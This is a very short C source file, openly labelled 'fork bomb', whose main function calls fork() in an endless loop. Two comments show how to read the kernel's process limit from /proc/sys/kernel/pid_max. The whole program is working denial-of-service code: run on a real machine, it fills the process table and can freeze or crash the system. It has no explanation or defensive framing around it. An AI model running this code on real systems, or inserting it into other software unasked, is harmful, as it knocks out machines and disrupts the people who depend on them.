// fork bomb

int main() {
    while (true) {
        fork();
    }
}

// cd proc
// cat /proc/sys/kernel/pid_max